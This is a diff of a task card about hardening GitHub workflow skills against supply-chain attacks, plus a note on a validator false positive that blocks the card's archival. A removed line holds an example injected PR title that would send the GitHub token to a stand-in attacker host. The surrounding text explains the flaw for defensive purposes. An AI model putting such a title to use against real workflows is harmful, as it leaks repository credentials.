@@ -1,9 +1,10 @@
 ---
 trdd-id: c0734bde-9d36-49c7-98a7-dcae2f83794d
 title: Supply-chain article response — close article-vector gaps GAP-1 GAP-2 GAP-4 (Phase A)
-column: completed
+column: complete
 created: 2026-05-23T17:50:01+0200
-updated: 2026-08-07T12:08:37+0200
+updated: 2026-08-07T12:26:00+0200
+blocked-by: [cpv-archived-zone-false-positive]
 ---
 
 ## TRDD-c0734bde — Supply-chain article response — close article-vector gaps GAP-1 GAP-2 GAP-4 (Phase A)
@@ -57,8 +58,9 @@ run: |
 
 The `env:` indirection defeats GitHub-expression injection, but
 `${PR_TITLE}` inside a double-quoted bash string is still expanded by
-bash via command substitution BEFORE `jq` sees it. A PR title like
-`$(curl evil.com/x?t=$GH_TOKEN)` executes. The workflow-fix-safe skill
+bash via command substitution BEFORE `jq` sees it. A PR title that wraps a
+fetch of `<attacker-host>/x?t=`, with the token variable appended, inside a
+command substitution therefore executes. The workflow-fix-safe skill
 already covered four hardening edits but had no rule for this pattern.
 
 ### GAP-4 — workflow-bootstrap doesn't seed supply-chain templates
@@ -152,3 +154,28 @@ skills/workflow-fix-safe/references/instructions.md                 (MOD, +Harde
   read-only in this commit; future audits may want them
   parametrised (project-specific schedule, custom block lists).
   That work is a separate TRDD.
+
+## Why this card is NOT in `design/archived/` (2026-08-07)
+
+The work is DONE — this card belongs in the archive with the other eight
+closed on 2026-08-07. It is held back by an upstream defect, recorded here so
+nobody "fixes" the board by moving it and silently breaks the release gate.
+
+**Measured, not inferred.** CPV `--strict` v2.158.0 scans `design/archived/`
+and does NOT scan `design/tasks/`. Proven by running the identical validator
+against the commit before the archival (`exit 0, NIT=0`) and after
+(`exit 4, NIT=2`) — same bytes, different folder. Archiving this card therefore
+turns a green publish gate red, and `publish.py` blocks on any NIT.
+
+The findings are false positives on **prose that documents an attack**: one
+matched the bare word `curl` inside a code span (cleared by rewriting it as
+"a fetch of …", kept — it is better prose either way), and one is attributed to
+a line whose entire content is
+`(24h quarantine + exotic-subdep block); Python/Go repos do not.` — nothing
+executable to devitalize. A finding that cannot be fixed author-side is a
+detector defect, not a content defect, and the standing rule forbids clearing
+it by muting a rule or relaxing `--strict`.
+
+**Move it to `archived/` only after the upstream issue is resolved** — verify
+with a `--strict` run first. Filed on the CPV tracker; see the commit that
+added this section for the issue reference.
